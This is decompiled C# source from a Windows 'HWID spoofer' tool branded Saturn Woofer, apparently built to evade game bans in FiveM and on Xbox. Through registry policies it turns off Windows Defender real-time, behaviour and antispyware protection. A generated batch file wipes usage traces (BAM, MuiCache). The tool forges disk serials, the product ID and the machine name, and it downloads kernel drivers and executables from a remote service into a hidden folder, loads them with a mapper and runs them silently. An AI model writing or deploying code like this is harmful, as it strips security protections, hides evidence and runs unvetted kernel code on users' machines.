      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "5000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 14, RegistryValueKind.DWord);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", (object) 1);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", (object) "1", RegistryValueKind.DWord);
      Main.HWIDclick();
      string str = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
      using (StreamWriter streamWriter = new StreamWriter(str))
      {
        streamWriter.WriteLine("echo off");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("taskkill /f /im Steam.exe /t");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("set hostspath=%windir%\\System32\\drivers\\etc\\hosts");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\steam_api64.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\DigitalEntitlements");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc LeanV2");
        streamWriter.WriteLine("cls");
      }
      Process.Start(str).WaitForExit();
      System.IO.File.Delete(str);
      int num = (int) MessageBox.Show("Spoofed Windows Info!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    public static string RandomId(int length)
    {
      string str1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      string str2 = "";
      Random random = new Random();
      for (int index = 0; index < length; ++index)
        str2 += str1[random.Next(str1.Length)].ToString();
      return str2;
    }

    public static void Disk()
    {
      foreach (string subKeyName1 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
      {
        foreach (string subKeyName2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1).GetSubKeyNames())
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1 + "\\" + subKeyName2 + "\\Target Id 0\\Logical Unit Id 0", true);
          if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
          {
            string s1 = Main.RandomId(14);
            string s2 = Main.RandomId(14);
            registryKey.SetValue("DeviceIdentifierPage", (object) Encoding.UTF8.GetBytes(s2));
            registryKey.SetValue("Identifier", (object) s1);
            registryKey.SetValue("InquiryData", (object) Encoding.UTF8.GetBytes(s1));
            registryKey.SetValue("SerialNumber", (object) s2);
          }
        }
      }
      foreach (string subKeyName in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
        Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + subKeyName, true).SetValue("Identifier", (object) (Main.RandomId(8) + "-" + Main.RandomId(8) + "-A"));
    }

    public static void Kernel()
    {
      if (Directory.Exists("C:\\Program Files\\WindowsCache"))
      {
        if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\mp2.exe"))
          System.IO.File.Delete("C:\\Program Files\\WindowsCache\\mp2.exe");
        if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\kerls.sys"))
          System.IO.File.Delete("C:\\Program Files\\WindowsCache\\kerls.sys");
      }
      if (!Directory.Exists("C:\\Program Files\\WindowsCache"))
        Directory.CreateDirectory("C:\\Program Files\\WindowsCache").Attributes = FileAttributes.Hidden | FileAttributes.Directory;
      System.IO.File.WriteAllBytes("C:\\Program Files\\WindowsCache\\mp2.exe", Saturn.Forms.Saturn.KeyAuthApp.download("314168"));
      System.IO.File.SetAttributes("C:\\Program Files\\WindowsCache\\mp2.exe", FileAttributes.Hidden);
      System.IO.File.WriteAllBytes("C:\\Program Files\\WindowsCache\\kerls.sys", Saturn.Forms.Saturn.KeyAuthApp.download("558301"));
      System.IO.File.SetAttributes("C:\\Program Files\\WindowsCache\\kerls.sys", FileAttributes.Hidden);
      using (StreamWriter text = System.IO.File.CreateText("C:\\Program Files\\WindowsCache\\p.bat"))
        text.WriteLine("mp2.exe kerls.sys");
      Process.Start(new ProcessStartInfo("C:\\Program Files\\WindowsCache\\p.bat")
      {
        CreateNoWindow = true,
        UseShellExecute = false
      });
    }

    public static void NullSerials()
    {
      if (Directory.Exists("C:\\Program Files\\WindowsCache"))
      {
        if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\mapper.exe"))
          System.IO.File.Delete("C:\\Program Files\\WindowsCache\\mapper.exe");
        if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\cock.sys"))
          System.IO.File.Delete("C:\\Program Files\\WindowsCache\\cock.sys");
        if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\p.bat"))
          System.IO.File.Delete("C:\\Program Files\\WindowsCache\\p.bat");
        if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\p2.bat"))
          System.IO.File.Delete("C:\\Program Files\\WindowsCache\\p2.bat");
        if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\drv.sys"))
          System.IO.File.Delete("C:\\Program Files\\WindowsCache\\drv.sys");
        if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\bbc.sys"))
          System.IO.File.Delete("C:\\Program Files\\WindowsCache\\bbc.sys");
        if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\p3.bat"))
          System.IO.File.Delete("C:\\Program Files\\WindowsCache\\p3.bat");
      }
      if (!Directory.Exists("C:\\Program Files\\WindowsCache"))
        Directory.CreateDirectory("C:\\Program Files\\WindowsCache").Attributes = FileAttributes.Hidden | FileAttributes.Directory;
      Path.GetTempPath();
      System.IO.File.WriteAllBytes("C:\\Program Files\\WindowsCache\\mapper.exe", Saturn.Forms.Saturn.KeyAuthApp.download("781789"));
      System.IO.File.SetAttributes("C:\\Program Files\\WindowsCache\\mapper.exe", FileAttributes.Hidden);
      System.IO.File.WriteAllBytes("C:\\Program Files\\WindowsCache\\cock.sys", Saturn.Forms.Saturn.KeyAuthApp.download("051053"));
      System.IO.File.SetAttributes("C:\\Program Files\\WindowsCache\\cock.sys", FileAttributes.Hidden);
      System.IO.File.WriteAllBytes("C:\\Program Files\\WindowsCache\\drv.sys", Saturn.Forms.Saturn.KeyAuthApp.download("812606"));
      System.IO.File.SetAttributes("C:\\Program Files\\WindowsCache\\drv.sys", FileAttributes.Hidden);
      System.IO.File.WriteAllBytes("C:\\Program Files\\WindowsCache\\bbc.sys", Saturn.Forms.Saturn.KeyAuthApp.download("558239"));
      System.IO.File.SetAttributes("C:\\Program Files\\WindowsCache\\bbc.sys", FileAttributes.Hidden);
      using (StreamWriter text = System.IO.File.CreateText("C:\\Program Files\\WindowsCache\\p.bat"))
        text.WriteLine("mapper.exe cock.sys");
      using (StreamWriter text = System.IO.File.CreateText("C:\\Program Files\\WindowsCache\\p2.bat"))
        text.WriteLine("mapper.exe drv.sys");
      using (StreamWriter text = System.IO.File.CreateText("C:\\Program Files\\WindowsCache\\p3.bat"))
        text.WriteLine("mapper.exe bbc.sys");
      ProcessStartInfo startInfo1 = new ProcessStartInfo("C:\\Program Files\\WindowsCache\\p.bat");
      startInfo1.CreateNoWindow = true;
      startInfo1.UseShellExecute = false;
      Process.Start(startInfo1);
      Thread.Sleep(1000);
      ProcessStartInfo startInfo2 = new ProcessStartInfo("C:\\Program Files\\WindowsCache\\p2.bat");
      startInfo1.CreateNoWindow = true;
      startInfo1.UseShellExecute = false;
      Process.Start(startInfo2);
      Thread.Sleep(1000);
      ProcessStartInfo startInfo3 = new ProcessStartInfo("C:\\Program Files\\WindowsCache\\p3.bat");
      startInfo1.CreateNoWindow = true;
      startInfo1.UseShellExecute = false;
      Process.Start(startInfo3);
      if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\mapper.exe"))
        System.IO.File.Delete("C:\\Program Files\\WindowsCache\\mapper.exe");
      if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\cock.sys"))
        System.IO.File.Delete("C:\\Program Files\\WindowsCache\\cock.sys");
      if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\p.bat"))
        System.IO.File.Delete("C:\\Program Files\\WindowsCache\\p.bat");
      if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\p2.bat"))
        System.IO.File.Delete("C:\\Program Files\\WindowsCache\\p2.bat");
      if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\drv.sys"))
        System.IO.File.Delete("C:\\Program Files\\WindowsCache\\drv.sys");
      if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\bbc.sys"))
        System.IO.File.Delete("C:\\Program Files\\WindowsCache\\bbc.sys");
      if (System.IO.File.Exists("C:\\Program Files\\WindowsCache\\p3.bat"))
        System.IO.File.Delete("C:\\Program Files\\WindowsCache\\p3.bat");
      try
      {
        Directory.Delete("C:\\Program Files\\WindowsCache");
      }
      catch
      {
      }
    }

    private void siticoneRoundedButton3_Click(object sender, EventArgs e)
    {
      Main.Disk();
      Main.NullSerials();
      int num = (int) MessageBox.Show("Spoofed Disk!", "Saturn Woofer", MessageBoxButtons.OK);
    }

    public static string GenerateString(int size)
    {
      char[] chArray = new char[size];
      for (int index = 0; index < size; ++index)
        chArray[index] = "ABCDEF0123456789"[Main.random.Next("ABCDEF0123456789".Length)];
      return new string(chArray);
    }

    private void siticoneRoundedButton8_Click(object sender, EventArgs e)
    {
      string tempPath = Path.GetTempPath();
      byte[] bytes = Saturn.Forms.Saturn.KeyAuthApp.download("033856");
      System.IO.File.WriteAllBytes(tempPath + this.xynw + ".bat", bytes);
      System.IO.File.SetAttributes(tempPath + this.xynw + ".bat", FileAttributes.Hidden);
      Process.Start(tempPath + this.xynw + ".bat");
      Thread.Sleep(2500);
      this.xynwbyzia();
      int num = (int) MessageBox.Show("Spoofed Xbox!", "Saturn Woofer", MessageBoxButtons.OK);
    }

    public static bool SetMachineName(string newName)
    {
      RegistryKey localMachine = Registry.LocalMachine;
      string subkey1 = "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName";
      RegistryKey subKey1 = localMachine.CreateSubKey(subkey1);
      subKey1.SetValue("ComputerName", (object) newName);
      subKey1.Close();
      string subkey2 = "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName";
      RegistryKey subKey2 = localMachine.CreateSubKey(subkey2);
      subKey2.SetValue("ComputerName", (object) newName);
      subKey2.Close();
      string subkey3 = "SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\";
      RegistryKey subKey3 = localMachine.CreateSubKey(subkey3);
      subKey3.SetValue("Hostname", (object) newName);
      subKey3.SetValue("NV Hostname", (object) newName);
      subKey3.Close();
      return true;
    }

    public static void SpoofPCName()
    {
    }

    private void setPCName()
    {
      RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
      RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", true);
      RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", true);
      if (registryKey1 == null)
        return;
      registryKey1.SetValue("ComputerName", (object) ("Desktop-" + Main.GenerateString(6)), RegistryValueKind.String);
      registryKey2.SetValue("ComputerName", (object) ("Desktop-" + Main.GenerateString(6)), RegistryValueKind.String);
      registryKey3.SetValue("HostName", (object) ("Desktop-" + Main.GenerateString(6)), RegistryValueKind.String);
      registryKey3.Close();
      registryKey2.Close();
      registryKey1.Close();
    }

    private void siticoneRoundedButton6_Click(object sender, EventArgs e)
    {
      this.setPCName();
      Main.SetMachineName(Main.GenerateString(6));
      if (MessageBox.Show("Name Spoofed, Do you want to restart your PC Now?", "Saturn Woofer", MessageBoxButtons.YesNo) != DialogResult.Yes)
        return;
      Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
      {
        CreateNoWindow = true,
        UseShellExecute = false,
        ErrorDialog = false
      });
    }

    private static void hwid()
    {
      try
      {
        Process process = new Process();
        process.StartInfo.Arguments = "netsh advfirewall firewall delete rule name = fivem_b2545_gtaprocess.exe";
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        process.WaitForExit();
        int num = (int) MessageBox.Show("Enabled");
      }
      catch
      {
        int num = (int) MessageBox.Show("There was an error, try again later", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private void siticoneRoundedButton5_Click(object sender, EventArgs e)
    {
      string str = Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5);
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
      registryKey.SetValue("ProductID", (object) str);
      registryKey.Close();
      int num = (int) MessageBox.Show("PrID Changed To: " + Main.CurrentProductID(), "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    public static string CurrentProductID()
    {
      string name1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
      string name2 = "ProductID";
      string str;
      using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
      {
        using (RegistryKey registryKey2 = registryKey1.OpenSubKey(name1))
          str = ((registryKey2 != null ? registryKey2.GetValue(name2) : throw new KeyNotFoundException(string.Format("Key Not Found: {0}", (object) name1))) ?? throw new IndexOutOfRangeException(string.Format("Index Not Found: {0}", (object) name2))).ToString();
      }
      return str;
    }

    private void label6_Click(object sender, EventArgs e)
    {
    }

    private void settingspanel_Paint_2(object sender, PaintEventArgs e)
    {
    }

    private void siticoneLabel8_Click(object sender, EventArgs e) => Process.Start("https://discord.gg/spoofer");

